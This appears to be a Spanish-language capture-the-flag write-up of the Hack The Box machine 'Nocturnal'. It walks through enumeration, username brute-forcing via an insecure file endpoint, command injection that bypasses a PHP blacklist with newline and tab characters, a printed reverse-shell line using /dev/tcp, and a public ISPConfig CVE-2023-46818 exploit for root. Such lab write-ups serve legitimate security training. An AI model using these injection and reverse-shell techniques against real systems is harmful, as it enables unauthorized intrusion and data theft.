---
title: "Nocturnal"
date: "2025-05-11T20:00:00-05:00"
type: "maquinas"
draft: true
tags: ["Analisis-De-Codigo", "CVE", "CVE-2023-46818", "Caido", "Port forwarding", "ISPCONFIG", "Sqlite3"]
---

### Descripción

 Una maquina que aunque sencilla nos sirve para practicar algunas cosas esenciales como lo pueden ser la interceptación de peticiones, el análisis de código y el port fowarding. 

# Enumeración

Lo primero que siempre hacemos es enumerar los puertos que una maquina tiene abiertos para ello usamos el siguiente comando de nmap:

```bash
sudo nmap -p- --open --min-rate 5000 -sS -Pn -n 10.10.11.64 -oG allPorts
```

- -p-: Escanea todos los puertos (1-65535).
- –open: Solo muestra los puertos abiertos.
- –min-rate 5000: Establece una tasa mínima de paquetes por segundo.
- sS: Realiza un escaneo SYN “sigiloso”.
- Pn: No hace ping (asume que el host está activo).
- n: No realiza resolución DNS.
- oG allPorts: Guarda la salida en formato grepeable en el archivo allPorts.

Con esto podremos ver que esta el puerto 80 abierto por lo que vamos a intentar ver brevemente la pagina web que esta en el puerto ya que este corresponde al servicio `http` , para esto vamos a usar `whatweb` :

```bash
whatweb 10.10.11.64
```
<a href="https://imgur.com/VWyTEj2"><img src="https://imgur.com/VWyTEj2.png" title="source: imgur.com" /></a>


Vemos que esta corriendo en Ubuntu y que tiene un redireccionamiento hacia `nocturnal.htb` por lo que lo vamos a agregar al `/etc/hosts` .

```bash
sudo nano /etc/hosts
```

<a href="https://imgur.com/E60Ftbh"><img src="https://imgur.com/E60Ftbh.png" title="source: imgur.com" /></a>

Después de haber hecho esto vamos a usar nmap para hacer un escaneo mas a fondo de los dos puertos que nos mostro abiertos el 22 y el 80.

```bash
nmap -p22,80 -sVC -A 10.10.11.64 -oN target
```

- p22,80: Escanea específicamente los puertos 22 y 80.
- sVC: Combina las opciones -sV (detección de versión) y -sC (scripts por defecto).
- A: Habilita la detección de OS, versiones, scripts y traceroute.
- oN target: Guarda la salida en formato normal en el archivo target.

<a href="https://imgur.com/COS1xmj"><img src="https://imgur.com/COS1xmj.png" title="source: imgur.com" /></a>

## Puerto 80

<a href="https://imgur.com/X5nMMcT"><img src="https://imgur.com/X5nMMcT.png" title="source: imgur.com" /></a>

Encontraremos una pagina bastante simple que al parecer nos permite primero que todo registrarnos e iniciar sesión, la funcionalidad de la pagina es cargar y ver archivos Word, Excel y PDF lo primero que podemos probar es ingresar con usuarios y contraseñas predecibles, pero no nos funcionara por lo que nos crearemos una cuenta.

Al momento de iniciar sesión con nuestra cuenta nos mostrara la pagina para subir los archivos y presuntamente visualizarlos, si indagar mucho ahora sabemos que esta usando `php` de fondo debido a la `URL` que nos muestra:

<a href="https://imgur.com/CoMj5FJ"><img src="https://imgur.com/CoMj5FJ.png" title="source: imgur.com" /></a>

Con este conocimiento vamos a tratar de hallar subdominios y subdirectorios para ello vamos a usar `gobuster` y los diccionarios de `seclists` :

```bash
gobuster dir -u http://nocturnal.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --no-error -t 200 -x php
```

Con este comando estamos probando cada palabra en el diccionario como un subdirectorio además de esto también probamos agregándole la extensión `.php` todo esto usando 200 hilos gracias al parámetro `-t` , lo que nos mostrara el comando será lo siguiente:

<a href="https://imgur.com/ntYQxfa"><img src="https://imgur.com/ntYQxfa.png" title="source: imgur.com" /></a>

```bash
gobuster vhost -u http://nocturnal.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 200 --append-domain --no-error -r
```

Para hallar subdominios el comando cambia un poco pero es bastante similar pero de este no obtendremos ningún resultado.

Volviendo a la carga de archivos podemos subir el archivo y descargarlo:

<a href="https://imgur.com/l6aXWZ1"><img src="https://imgur.com/l6aXWZ1.png" title="source: imgur.com" /></a>

Si interceptamos esta solicitud para descargar el archivo con `caido` veremos lo siguiente:

<a href="https://imgur.com/3VmtRMh"><img src="https://imgur.com/3VmtRMh.png" title="source: imgur.com" /></a>

Si lo mandamos al `replay` usando el comando `ctrl+r` y enviamos la solicitud para ver cual es la respuesta tendremos lo siguiente:

<a href="https://imgur.com/zuInG9V"><img src="https://imgur.com/zuInG9V.png" title="source: imgur.com" /></a>

Si cambiamos el archivo nos dirá que no existe dicho archivo pero aún mas interesante es que si cambiamos el usuario nos dice que el usuario no existe de esta forma tenemos un camino posible para listar usuarios, que es lo que vamos a hacer con `caido` usando un diccionario:

Lo primero que vamos a hacer es clic derecho sobre nuestra `request` y vamos a mandarla a `Automate` luego de hacer esto vamos a seleccionar el usuario que enviamos en nuestra petición y le vamos a dar al siguiente símbolo mas:

<a href="https://imgur.com/1CQd09d"><img src="https://imgur.com/1CQd09d.png" title="source: imgur.com" /></a>

Lo siguiente que vamos a hacer es dirigirnos a la pestaña `Files` y subir un diccionario de usuario como por ejemplo el que esta en la ruta `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` .

Volvemos a la pestaña `Automate` y en la `payload` ponemos el archivo que acabamos de subir y ponemos a correr la fuerza bruta con `Run` .

Después de esto nos van a quedar bastantes solicitudes pero podremos observar un patrón por lo que lo podemos filtrar de la siguiente forma:

<a href="https://imgur.com/Td4jtpu"><img src="https://imgur.com/Td4jtpu.png" title="source: imgur.com" /></a>

Lo que hicimos fue filtrar por la longitud de la respuesta siempre que fuera diferente a 3268 nos iba a mostrar el resultado y aquí vemos 3 opciones `admin` `amanda` y `jhon` por lo que pudimos realizar de forma exitosa el descubrimiento de usuarios.

Si volvemos a la pestaña de replay y cambiamos el usuario a `amanda` veremos los archivos que tiene disponibles para descargar entre ellos uno llamado `privacy.odt`:

<a href="https://imgur.com/LXCzgkh"><img src="https://imgur.com/LXCzgkh.png" title="source: imgur.com" /></a>

Si iniciamos sesión en la pagina y entramos el siguiente link en el navegador podremos descargar este archivo y revisarlo [`http://nocturnal.htb/view.php?username=amanda&file=privacy.odt`](http://nocturnal.htb/view.php?username=amanda&file=privacy.odt) .

Si abrimos el archivo mediante el explorador de archivos que tiene Kali podremos ver que hay diferentes archivos dentro revisando cada uno de ellos encontramos la contraseña de `amanda` en el archivo llamado `content.xml` .

## Panel admin

Ya con las credenciales de `amanda`podemos entrar al panel de administrador de la pagina donde se encuentra expuesta toda la lógica de la pagina mediante los archivos de su backend entre ellos podemos ver como esta listando los archivos de extensión `php` con el siguiente codigo:

```php
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}
```

También hay un intento de sanitizar las entradas:

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

Pero no limpia las entradas como nueva líneas `%0a` y `\n` o el tab horizontal `%09` y `\t` , y aquí es donde entra la vulnerabilidad en el sistema de `backups` de la pagina, la cual crea una Shell de comandos, si interceptamos la petición para crear el backup veremos lo siguiente: 

<a href="https://imgur.com/8EUrFsB"><img src="https://imgur.com/8EUrFsB.png" title="source: imgur.com" /></a>

Por lo que teniendo conocimiento de las entradas que no limpia podemos intentar inyectar de alguna forma comandos, como lo es la siguiente:

<a href="https://imgur.com/kshQyrk"><img src="https://imgur.com/kshQyrk.png" title="source: imgur.com" /></a>

Con esto en conocimiento podemos tratar de montar una revshell, de la siguiente manera vamos a crear un archivo llamado `revshell.sh` con el siguiente contenido:

```bash
sh -i >& /dev/tcp/IP/4444 0>&1

# En consola vamos a ejecutar el siguiente comando:
python3 -m http.server 
```

Y ya lo siguiente seria con la petición que habíamos interceptado, de modo que vamos a descargar la rever Shell que tenemos en nuestra maquina y la vamos a ejecutar con bash: 

<a href="https://imgur.com/3scS3n3"><img src="https://imgur.com/3scS3n3.png" title="source: imgur.com" /></a>

<a href="https://imgur.com/OzvZlIL"><img src="https://imgur.com/OzvZlIL.png" title="source: imgur.com" /></a>

<a href="https://imgur.com/ZQzRe20"><img src="https://imgur.com/ZQzRe20.png" title="source: imgur.com" /></a>

# User

Revisando los archivos dentro del directorio `/var/www/` encontramos una base de datos `Sqlite3` su ruta exacta es `/var/www/nocturnal_database/nocturnal_database.db` de modo que si la abrimos con sqllite3 podemos hallar los hashes de varios usuarios:

<a href="https://imgur.com/MtZaeV6"><img src="https://imgur.com/MtZaeV6.png" title="source: imgur.com" /></a>

Si nos dirigimos a la pagina de `crackstation` podremos romper dos de estos hashes:

<a href="https://imgur.com/a5CJM28"><img src="https://imgur.com/a5CJM28.png" title="source: imgur.com" /></a>

Si nos conectamos por ssh al usuario tobias tendremos la flag de usuario.

# Root

Ya desde este punto lo primero que vamos a mirar son las mismas posibilidades para el escalamiento de privilegios de siempre como los permisos sudo o las crontabs; en este caso no hay permisos de ejecutar sudo ni hay una crontab que nos sirva, por lo que revisamos los puertos locales con el siguiente comando:

```bash
ss -lantp 
```

<a href="https://imgur.com/1frEGgv"><img src="https://imgur.com/1frEGgv.png" title="source: imgur.com" /></a>

Podemos observar un puerto 8080 en escucha entonces lo vamos a intentar montar con un `port forwarding` :

```bash
ssh -L {port}:localhost:8080 tobias@nocturnal.htb
# Asegurate de que el puerto que vayas a usar no este en uso
```

Ya con esto podremos ingresar al servicio desde nuestro navegador:

<a href="https://imgur.com/pyhpi8k"><img src="https://imgur.com/pyhpi8k.png" title="source: imgur.com" /></a>

Si probamos diferentes combinaciones con las credenciales que ya teníamos resulta que el usuario y la contraseña son `admin:slowmotionapocalypse` y con esto podemos ingresar en la sección de ayuda encontraremos la versión del `ispconfig` la cual podremos buscar para explotar alguna vulnerabilidad.

[https://github.com/ajdumanhug/CVE-2023-46818](https://github.com/ajdumanhug/CVE-2023-46818)

Encontramos este repositorio en GitHub que nos ayuda a conseguir una Shell mediante una inyección  en base64 al archivo `language_edit.php` , si lo ejecutamos proporcionando el usuario la contraseña y la URL para iniciar sesión podremos obtener una Shell:

<a href="https://imgur.com/dWhhOAl"><img src="https://imgur.com/dWhhOAl.png" title="source: imgur.com" /></a>

Y con esto seremos root y tendremos la ultima flag.